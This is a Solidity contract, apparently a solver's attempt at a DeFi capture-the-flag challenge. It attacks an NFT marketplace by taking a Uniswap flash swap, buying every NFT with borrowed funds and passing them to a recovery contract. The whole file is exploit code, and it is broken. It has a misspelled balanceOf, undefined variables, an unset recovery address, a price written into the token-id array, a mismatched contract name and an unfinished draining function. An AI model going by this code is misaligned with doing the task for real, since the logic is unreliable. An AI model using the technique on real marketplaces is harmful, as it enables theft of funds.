// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import '@openzeppelin/contracts/token/ERC721/IERC721.sol';
import '@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import '@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol';


contract AttackV2Puppet{
    IERC721 nft;
    IERC20 dvt;
    IERC20 weth;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecovery recovery;
    IUniswapV2Pair pair;
    IUniswapV2Router02 router;
    bool emptying;
    uint256 NFT_PRICE = 15 ether;

    constructor(address _token, address _weth, address _nft, address _marketplace, address _pair, address _router) public
    {
        dvt = IERC20(_token);
        weth = IERC20(_weth);
        nft = IERC721(_nft);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        pair = IUniswapV2Pair(_pair);
        router = IUniswapV2Router02(_router);
        emptying = false;
    }

    function attack() external
    {
        //calculate how much we will need later
        uint256 inputFor5WETH = getOracleQuote(NFT_PRICE);

        //get a flash loan from uniswap
        pair.swap(NFT_PRICE, inputFor5WETH, 5 ether, address(this), abi.encodeWithSelector(AttackV2Puppet.handleFlashLoan.selector));
    }


    function handleFlashLoan() public
    {
        //change all the WETH to ETH    
        weth.withdraw(15 ether);

        uint256[] memory tokenIds = [0,1,2,3,4,5];

        //Buy all the NFTs for 15 eth
        marketplace.buyMany{value: 15 ether}(tokenIds);

        //Give the NFTs to the developer
        for (uint256 id; id < 6; id++)
        {
            nft.safeTransferFrom(address(this), address(recovery), id);
        }

        address[] memory path = new address[](1);
        path[0] = address(dvt);

        //exchange 16 eth back to token to be able to fulfill the 2nd part of the swap (not clean some dust left)
        router.swapExactETHForTokens{value: 16 ether}(1, path, address(this), block.number + 1000);

        //approve the pair
        dvt.approve(address(pair), dvt.balaceOf(address(this)));
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4)
    {
        //return the selector
        return IERC721Receiver.onERC721Received.selector;
    }

    // Fetch the price from Uniswap v2 using the official libraries
    function getOracleQuote(uint256 amount) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(address(factory), address(weth), address(token));
        
        return UniswapV2Library.getAmountIn(amount, reservesToken, reservesWETH);
    }


    function empty_the_contract() external
    {
        emptying = true;
        //get the balance of the contract
        uint256 balance = address(marketplace).balance;

        //list our nft for the 0.01 eth we have 
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = 0;
        uint256[] memory prices = new uint256[](1);
        tokenIds[0] = 0.1 ether;
        marketplace.offerMany(tokenIds, prices);

        //buy our nft back


        emptying = false;
    }
}